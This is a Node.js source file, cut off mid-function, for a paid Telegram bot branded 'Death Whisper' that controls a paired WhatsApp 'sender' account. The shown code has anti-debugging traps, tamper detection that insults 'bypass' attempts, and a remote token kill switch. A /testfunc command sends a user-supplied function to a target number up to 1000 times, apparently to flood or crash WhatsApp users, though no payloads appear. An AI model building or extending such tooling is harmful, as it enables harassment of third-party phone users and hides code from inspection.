process.on("uncaughtException", err => {
  console.error("Uncaught Exception:", err.message);
});

process.on("unhandledRejection", err => {
  console.error("Unhandled Rejection:", err);
});

const { Telegraf } = require("telegraf");
const { spawn } = require("child_process");
const { pipeline } = require("stream/promises");
const { createWriteStream } = require("fs");
const fs = require("fs");
const path = require("path");
const jid = "0@s.whatsapp.net";
const vm = require("vm");
const os = require("os");
const FormData = require("form-data");
const https = require("https");
const dns = require("dns").promises;
const { URL } = require("url");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@lendxntaa/baileys");
//============( CONST ) =======\\
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require('./settings/config');
const axios = require('axios');
const JavaScriptObfuscator = require("javascript-obfuscator");
const acorn = require("acorn");
// =================== KONFIGURASI API ALIGHT ===================
const ACTIVATOR_CONFIG = {
    SUCCESS_IMAGE_URL: "https://files.catbox.moe/fv8860.jpg" // Ganti dengan URL foto bukti aktivasi kamu
};

async function safeDelete(ctx, messageId) {
  try {
    await ctx.telegram.deleteMessage(ctx.chat.id, messageId);
  } catch (err) {}
}
const createamSessions = new Map();
// =========== DATABASE CHANNEL FORCE JOIN ===========
const chFile = path.join(__dirname, 'channels.json');

const loadChannels = () => {
    try {
        if (fs.existsSync(chFile)) {
            return JSON.parse(fs.readFileSync(chFile, 'utf8'));
        }
        return [];
    } catch (err) {
        console.error('❌ Error loading channels:', err);
        return [];
    }
};

const saveChannels = (channels) => {
    try {
        fs.writeFileSync(chFile, JSON.stringify(channels, null, 2));
    } catch (err) {
        console.error('❌ Error saving channels:', err);
    }
};

let forceChannels = loadChannels();
const moment = require('moment-timezone');
const EventEmitter = require('events');
const makeInMemoryStore = ({ logger = console } = {}) => {
  const ev = new EventEmitter();

  let chats = {};
  let messages = {};
  let contacts = {};

  ev.on("messages.upsert", ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid;
      if (!messages[chatId]) messages[chatId] = [];
      messages[chatId].push(msg);

      if (messages[chatId].length > 100) {
        messages[chatId].shift();
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp,
      };
    }
  });

  ev.on("chats.set", ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat;
    }
  });

  ev.on("contacts.set", ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id];
    }
  });

  return {
    chats,
    messages,
    contacts,
    bind: evTarget => {
      evTarget.on("messages.upsert", m => ev.emit("messages.upsert", m));
      evTarget.on("chats.set", c => ev.emit("chats.set", c));
      evTarget.on("contacts.set", c => ev.emit("contacts.set", c));
    },
    logger,
  };
};

const thumbnailUrl = "https://files.catbox.moe/fv8860.jpg";
//============( SAFE SOCK ) =======\\
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
//============( SECURITY ) =======\\
const databaseURL = "https://raw.githubusercontent.com/artaxwhisper/artaxwhisper/refs/heads/main/tokens.json";

function activateSecureMode() {
  secureMode = true;
}

async function connectDB() {
  try {
    const res = await axios.get(databaseURL);
    if (res.status === 200 && res.data) {
      console.log(
      chalk.cyan('Let Me Checking Your Token From Database') 
      );
      
      // Ambil daftar token dari JSON GitHub
      const authorizedTokens = res.data.tokens || [];
      
      // Cek apakah tokenBot terdaftar
      if (!authorizedTokens.includes(tokenBot)) {
        console.error(
        chalk.red('Your Token Is Nothing From Database/INVALID! ')
        );
        console.error(
        chalk.red('Please Contact To Developer To Add Your Token To Her Database.')
        );
        process.exit(1); // Mematikan script secara paksa
      }

      console.log(
      chalk.green('Your Token Is Valid! Welcome To The Script')
      );
      return true;
    } else {
      throw new Error('Invalid Response');
    }
  } catch (error) {
    console.error('❌ Gagal memverifikasi database/token:', error.message);
    process.exit(1);
  }
}

(function () {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(
      chalk.cyan(`
            
██╗     ███████╗███╗   ██╗██████╗
██║     ██╔════╝████╗  ██║██╔══██╗
██║     █████╗  ██╔██╗ ██║██║  ██║
██║     ██╔══╝  ██║╚██╗██║██║  ██║
███████╗███████╗██║ ╚████║██████╔╝
╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝
 █████╗ ██████╗ ████████╗ █████╗ 
██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗
███████║██████╔╝   ██║   ███████║
██╔══██║██╔══██╗   ██║   ██╔══██║
██║  ██║██║  ██║   ██║   ██║  ██║
╚═╝  ╚═╝╚═╝   ╚═╝  ╚═╝   ╚═╝  ╚═╝
`)
    );
    console.log(
      chalk.cyan(`
» Script Name : Arta The Olympus X Death Whisper
» Developer   : Arlend Kaizen
» Version     : 14 Gen 2
» Information : @informationarta
`)
    );
}

  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (
        process.exit.toString().includes("Proxy") ||
        process.kill.toString().includes("Proxy")
      ) {
        console.log(
          chalk.bold.red(`
  BYPASS DETECTED!!
  YOUR BYPASS TOOLS ARE VERY BAD IDIOT.
  `)
        );
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(
            chalk.bold.red(`
  BYPASS DETECTED!!
  YOUR BYPASS TOOLS ARE VERY BAD IDIOT.
  `)
          );
          activateSecureMode();
          hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);
  //============( VALIDATE TOKEN ) =======\\


})();

const question = query =>
  new Promise(resolve => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, answer => {
      rl.close();
      resolve(answer);
    });
  });

async function isAuthorizedToken(token) {
  try {
    const res = await axios.get(databaseURL);
    const authorizedTokens = res.data.tokens || [];
    return authorizedTokens.includes(token);
  } catch (e) {
    return false;
  }
}

//============( FEATURE ) =======\\
const bot = new Telegraf(tokenBot);

bot.use((ctx, next) => {
  if (secureMode) return;
  return next();
});
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const premiumFile = "./database/premium.json";
const cooldownFile = "./database/cooldown.json";

const loadPremiumUsers = () => {
  try {
    const data = fs.readFileSync(premiumFile);
    return JSON.parse(data);
  } catch (err) {
    return {};
  }
};

const savePremiumUsers = users => {
  fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
  const premiumUsers = loadPremiumUsers();
  const expiryDate = moment()
    .add(duration, "days")
    .tz("Asia/Jakarta")
    .format("DD-MM-YYYY");
  premiumUsers[userId] = expiryDate;
  savePremiumUsers(premiumUsers);
  return expiryDate;
};

const removePremiumUser = userId => {
  const premiumUsers = loadPremiumUsers();
  delete premiumUsers[userId];
  savePremiumUsers(premiumUsers);
};

const isPremiumUser = userId => {
  const premiumUsers = loadPremiumUsers();
  if (premiumUsers[userId]) {
    const expiryDate = moment(premiumUsers[userId], "DD-MM-YYYY");
    if (moment().isBefore(expiryDate)) {
      return true;
    } else {
      removePremiumUser(userId);
      return false;
    }
  }
  return false;
};

//============ FUNCTION PREMIUM GROUP =======\\
const premiumGroupFile = './premiumGroups.json';
const premiumGroups = new Map();

function loadPremiumGroups() {
    try {
        if (fs.existsSync(premiumGroupFile)) {
            const data = fs.readFileSync(premiumGroupFile, 'utf8');
            const parsed = JSON.parse(data);
            premiumGroups.clear();
            Object.entries(parsed).forEach(([key, value]) => {
                premiumGroups.set(key, value);
            });
        }
        return premiumGroups;
    } catch (error) {
        console.error('Error loading premium groups:', error);
        return premiumGroups;
    }
}

function savePremiumGroups() {
    try {
        const data = Object.fromEntries(premiumGroups);
        fs.writeFileSync(premiumGroupFile, JSON.stringify(data, null, 2));
        return true;
    } catch (error) {
        console.error('Error saving premium groups:', error);
        return false;
    }
}

function isGroupPremium(groupId) {
    if (!premiumGroups.has(groupId)) return false;
    
    const data = premiumGroups.get(groupId);
    if (data.expiredAt && Date.now() > data.expiredAt) {
        premiumGroups.delete(groupId);
        savePremiumGroups();
        return false;
    }
    return true;
}

function getPremiumGroupData(groupId) {
    return premiumGroups.get(groupId) || null;
}

function getAllPremiumGroups() {
    const result = [];
    for (const [groupId, data] of premiumGroups) {
        if (data.expiredAt && Date.now() > data.expiredAt) {
            premiumGroups.delete(groupId);
            savePremiumGroups();
            continue;
        }
        result.push({ groupId, ...data });
    }
    return result;
}

function isValidId(id) {
    return id && (id.startsWith('-100') || id.startsWith('@')) && id.length > 5;
}

function addPremiumGroup(groupId, duration, adminId) {
    if (!isValidId(groupId)) {
        return { success: false, message: 'ID grup tidak valid!' };
    }

    if (isNaN(duration) || duration < 1) {
        return { success: false, message: 'Durasi harus berupa angka dalam hari!' };
    }

    if (isGroupPremium(groupId)) {
        return { success: false, message: 'Grup ini sudah terdaftar sebagai premium!' };
    }

    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + duration);

    const data = {
        admin: adminId,
        addedAt: Date.now(),
        duration: duration,
        expiredAt: expiryDate.getTime()
    };

    premiumGroups.set(groupId, data);
    savePremiumGroups();

    return {
        success: true,
        message: `Group ${groupId} premium sampai ${expiryDate.toLocaleDateString()}`,
        data: data
    };
}

function deletePremiumGroup(groupId) {
    if (!isValidId(groupId)) {
        return { success: false, message: 'ID grup tidak valid!' };
    }

    if (!isGroupPremium(groupId)) {
        return { success: false, message: `Group ${groupId} bukan premium!` };
    }

    premiumGroups.delete(groupId);
    savePremiumGroups();

    return {
        success: true,
        message: `Group ${groupId} premium dihapus!`
    };
}

loadPremiumGroups();

const loadCooldown = () => {
  try {
    const data = fs.readFileSync(cooldownFile);
    return JSON.parse(data).cooldown || 5;
  } catch {
    return 5;
  }
};

const saveCooldown = seconds => {
  fs.writeFileSync(
    cooldownFile,
    JSON.stringify({ cooldown: seconds }, null, 2)
  );
};

let cooldown = loadCooldown();
const userCooldowns = new Map();

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}
//============( CONNECT ) =======\\
const startSesi = async () => {
   const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Evox',
        }),
    };
    
    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `\`\`\`js
PROSES PAIRING
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected
\`\`\``;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "Markdown" }
          );
        } catch (e) {}
      }

      console.clear();
      isWhatsAppConnected = true;
      const currentTime = moment().tz("Asia/Jakarta").format("HH:mm:ss");
      console.log(chalk.bold.yellow(`Sender Connected`));
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
      console.log(
        chalk.red("[!] Tidak Ada Koneksi Whatsapp:"),
        shouldReconnect
          ? "[!] Segera Tautkan Perangkat"
          : "Silakan Menautkan Perangkat Lagi"
      );
      if (shouldReconnect) {
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};

startSesi();
//============( CHECK ) =======\\
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("🪧 » Tidak ada sender yang terhubung");
    return;
  }
  next();
};

const checkCooldown = (ctx, next) => {
  const userId = ctx.from.id;
  const now = Date.now();

  if (userCooldowns.has(userId)) {
    const lastUsed = userCooldowns.get(userId);
    const diff = (now - lastUsed) / 1000;

    if (diff < cooldown) {
      const remaining = Math.ceil(cooldown - diff);
      ctx.reply(`⏳ » Harap menunggu ${remaining} detik`);
      return;
    }
  }

  userCooldowns.set(userId, now);
  next();
};

const checkPremium = (ctx, next) => {
  const userId = ctx.from.id;
  const groupId = ctx.chat.id.toString();  
  if (isPremiumUser(userId)) return next();
  if (isGroupPremium(groupId)) return next();
  ctx.reply("❌ Akses hanya untuk premium!");
};

//============( COMMAND FEATURE ) =======\\
bot.command("addsender", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ » Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 » Format: /addsender 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ » Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ » Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(
        `✅ » WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`
      );
    }

    const code = await sock.requestPairingCode(phoneNumber, "LENDNTAA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    const pairingMenu = `\`\`\`js
PROSES PAIRING
☐ Number: ${phoneNumber}
☐ Pairing Code: ${formattedCode}
☐ Type: Not Connected
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: pairingMenu,
      parse_mode: "Markdown",
    });

    lastPairingMessage = {
      chatId: ctx.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber,
      pairingCode: formattedCode,
    };
  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async update => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`js
PROSES PAIRING
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected
\`\`\``;

      try {
        await bot.telegram.editMessageCaption(
          lastPairingMessage.chatId,
          lastPairingMessage.messageId,
          undefined,
          updateConnectionMenu,
          { parse_mode: "Markdown" }
        );
      } catch (e) {}
    }
  });
}

bot.command("setcd", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ » Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ");
  const seconds = parseInt(args[1]);

  if (isNaN(seconds) || seconds < 0) {
    return ctx.reply("🪧 » Format: /setcd 5");
  }

  cooldown = seconds;
  saveCooldown(seconds);
  ctx.reply(`✅ » Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsesi", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ » Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ » Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 » Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ » Gagal menghapus session");
  }
});

// ============ FUNCTION ADD ADMIN ============
const adminFile = path.join(__dirname, 'admin.json');

const loadAdmin = () => {
    try {
        if (fs.existsSync(adminFile)) {
            const data = fs.readFileSync(adminFile, 'utf8');
            return JSON.parse(data);
        }
        return [];
    } catch (err) {
        console.error('❌ Error loading admin:', err);
        return [];
    }
};

const saveAdmin = (adminList) => {
    try {
        fs.writeFileSync(adminFile, JSON.stringify(adminList, null, 2));
        console.log('✅ Admin saved successfully');
    } catch (err) {
        console.error('❌ Error saving admin:', err);
    }
};

let adminList = loadAdmin();

const isAdmin = (userId) => {
    return adminList.includes(parseInt(userId));
};

// ============ COMMAND ADD ADMIN ============
bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ » Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length === 0) {
        return ctx.reply("❌ Masukkan ID user.\nContoh: /addadmin 123456789");
    }

    const newAdmin = parseInt(args[0].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(newAdmin)) {
        return ctx.reply("❌ Input tidak valid.\nContoh: /addadmin 6843967527");
    }

    if (newAdmin === ownerID) {
        return ctx.reply("❌ Owner sudah memiliki akses penuh!");
    }

    if (!adminList.includes(newAdmin)) {
        adminList.push(newAdmin);
        saveAdmin(adminList);
        ctx.reply(`✅ User ${newAdmin} berhasil ditambahkan sebagai admin.`);
    } else {
        ctx.reply(`❌ User ${newAdmin} sudah menjadi admin.`);
    }
});

// ============ COMMAND DEL ADMIN ============
bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ » Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length === 0) {
        return ctx.reply("❌ Masukkan ID user.\nContoh: /deladmin 123456789");
    }

    const targetAdmin = parseInt(args[0].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(targetAdmin)) {
        return ctx.reply("❌ Input tidak valid.\nContoh: /deladmin 6843967527");
    }

    if (targetAdmin === ownerID) {
        return ctx.reply("❌ Tidak bisa menghapus owner!");
    }

    const adminIndex = adminList.indexOf(targetAdmin);
    if (adminIndex !== -1) {
        adminList.splice(adminIndex, 1);
        saveAdmin(adminList);
        ctx.reply(`✅ User ${targetAdmin} berhasil dihapus dari admin.`);
    } else {
        ctx.reply(`❌ User ${targetAdmin} bukan admin.`);
    }
});

// ============ COMMAND SET CHANNEL FORCE JOIN ============
bot.command('setch', async (ctx) => {
    const userId = ctx.from.id;

    // Hanya Owner atau Admin yang terdaftar yang bisa menggunakan perintah ini
    if (userId != ownerID) {
        return ctx.reply("❌ Akses ditolak! Khusus Pemilik!.");
    }

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length === 0) {
        return ctx.reply("❌ Masukkan username/link channel.\nContoh: /setch @ch1 @ch2\natau\n/setch off (untuk mematikan force join)");
    }

    if (args[0].toLowerCase() === 'off') {
        forceChannels = [];
        saveChannels([]);
        return ctx.reply("✅ Force Join berhasil dinonaktifkan.");
    }

    const newChannels = args.map(ch => ch.replace('https://t.me/', '').replace('@', '').trim()).filter(ch => ch.length > 0);

    forceChannels = newChannels;
    saveChannels(forceChannels);

    const listCh = forceChannels.map(ch => `@${ch}`).join(', ');
    ctx.reply(`✅ Berhasil mengatur Force Join Channel:\n${listCh}`);
});

// ============ COMMAND REACTION CHANNEL ============
bot.command('reactch', async (ctx) => {
    const userId = ctx.from.id;
    
    if (!isAdmin(userId)) {
        return ctx.reply("❌ Akses ditolak! Khusus Admin.");
    }

    const rawInput = ctx.message.text.substring(9).trim();
    if (!rawInput.includes('|')) {
        return ctx.reply("❌ Format salah!\n🪧 Contoh: /reactch 🔥 | https://t.me/c/12345/10");
    }

    const parts = rawInput.split('|');
    const emojisInput = parts[0].trim();
    const linkInput = parts[1].trim();

    const emojiArray = Array.from(emojisInput).filter(e => e.trim() !== '');
    if (emojiArray.length === 0) return ctx.reply("❌ Emoji tidak terdeteksi!");
    const singleEmoji = emojiArray[0];
    const reactions = [{ type: "emoji", emoji: singleEmoji }];

    let chatId, messageId;
    try {
        if (linkInput.includes('/c/')) {
            const linkParts = linkInput.split('/c/')[1].split('/');
            chatId = "-100" + linkParts[0];
            messageId = parseInt(linkParts[1]);
        } else {
            const linkParts = linkInput.split('t.me/')[1].split('/');
            chatId = "@" + linkParts[0];
            messageId = parseInt(linkParts[1]);
        }
        await ctx.telegram.callApi('setMessageReaction', {
            chat_id: chatId,
            message_id: messageId,
            reaction: reactions
        });
        ctx.reply(`✅ Sukses memberikan reaction ${singleEmoji} ke pesan tersebut.`);
    } catch (e) {
        let errorMsg = e.message;
        if (errorMsg.includes("REACTION_INVALID")) {
            errorMsg = "Emoji ditolak Channel (Coba pakai emoji dasar tanpa warna kulit).";
        }
        ctx.reply(`❌ Gagal: ${errorMsg}`);
    }
});

// ============ COMMAND /addprem ============
bot.command("addprem", async ctx => {
  if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
    return ctx.reply("❌ » Akses hanya untuk Owner/Admin");
  }
  const args = ctx.message.text.split(" ");
  if (args.length < 3) {
    return ctx.reply("🪧 » Format: /addprem 12345678 30");
  }
  const userId = args[1];
  const duration = parseInt(args[2]);
  if (isNaN(duration)) {
    return ctx.reply("🪧 » Durasi harus berupa angka dalam hari");
  }
  const expiryDate = addPremiumUser(userId, duration);
  ctx.reply(
    `✅ » ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`
  );
});

// ============ COMMAND /delprem ============
bot.command("delprem", async ctx => {
  if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
    return ctx.reply("❌ » Akses hanya untuk Owner/Admin");
  }
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("🪧 » Format: /delprem 12345678");
  }
  const userId = args[1];
  removePremiumUser(userId);
  ctx.reply(
    `✅ » ${userId} telah berhasil dihapus dari daftar pengguna premium`
  );
});

// ============ COMMAND /addpremgb ============
bot.command('addpremgb', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ');
    
    if (args.length < 3) {
      return ctx.reply('❌ Format: /addpremgb -1001234567890 30');
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (!isValidId(groupId)) {
      return ctx.reply('❌ ID grup tidak valid!');
    }

    if (isNaN(duration) || duration < 1) {
      return ctx.reply('❌ Durasi harus berupa angka dalam hari!');
    }

    if (isGroupPremium(groupId)) {
      return ctx.reply('⚠️ Grup ini sudah terdaftar sebagai premium!');
    }

    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + duration);

    const data = loadPremiumGroups();
    data[groupId] = {
      admin: ctx.from.id,
      addedAt: Date.now(),
      duration: duration,
      expiredAt: expiryDate.getTime()
    };
    savePremiumGroups(data);

    ctx.reply(`✅ Group ${groupId} premium sampai ${expiryDate.toLocaleDateString()}`);
  } catch (error) {
    ctx.reply(`❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.command('delpremgb', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
      return ctx.reply('❌ Format: /delpremgb -1001234567890');
    }

    const groupId = args[1];

    if (!isValidId(groupId)) {
      return ctx.reply('❌ ID grup tidak valid!');
    }

    if (!isGroupPremium(groupId)) {
      return ctx.reply(`❌ Group ${groupId} bukan premium!`);
    }

    const data = loadPremiumGroups();
    delete data[groupId];
    savePremiumGroups(data);

    ctx.reply(`✅ Group ${groupId} premium dihapus!`);
  } catch (error) {
    ctx.reply(`❌ Terjadi kesalahan: ${error.message}`);
  }
});

// ============ COMMAND /tiktokdl ============
bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("iqc", checkPremium, async ctx => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  const fullText = ctx.message.text.replace(/^\/iqc\s+/i, "");
  const [input, batteryInput] = fullText.split(",").map(s => s?.trim());

  if (!input || !batteryInput) {
    return ctx.reply(
      "❌ Incorrect format.\n\nExample:\n/iqc arlend5,15",
      { parse_mode: "Markdown" }
    );
  }

  const battery = parseInt(batteryInput);
  if (isNaN(battery) || battery < 0 || battery > 100) {
    return ctx.reply("❌ Battery must be a number between 0–100.", {
      parse_mode: "Markdown",
    });
  }

  const hours = Math.floor(Math.random() * 24)
    .toString()
    .padStart(2, "0");
  const minutes = Math.floor(Math.random() * 60)
    .toString()
    .padStart(2, "0");
  const time = `${hours}:${minutes}`;

  const carriers = [
    "TELKOMSEL",
    "INDOSAT OOREDOO",
    "XL AXIATA",
    "SMARTFREN",
    "IM3 (THREE)",
    "BY.U",
  ];
  const carrier = carriers[Math.floor(Math.random() * carriers.length)];
  const signalStrength = Math.floor(Math.random() * 4) + 1;

  const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(input)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=${signalStrength}&emojiStyle=apple`;

  try {
    await ctx.replyWithChatAction("upload_photo");

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: `-# *iPhone Quoted Generator*\n\n💬 ${input}\n🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Arlend", url: "https://t.me/lendd3", style: "primary"}],
          ],
        },
      }
    );
  } catch (err) {
    console.error(err.message);
    ctx.reply("❌ Terjadi kesalahan saat memproses gambar.");
  }
});

// ===== TES FUNCTION =====
bot.command("testfunc", checkPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    const text = ctx.message?.text || "";
    const args = text.split(" ");

    if (args.length < 3) {
      return ctx.reply("🪧 Example : /testfunc 62xxx 10 (reply your function)");
    }

    const q = args[1];
    let jumlah = Math.max(1, Math.min(parseInt(args[2]) || 1, 1000));

    if (isNaN(jumlah)) {
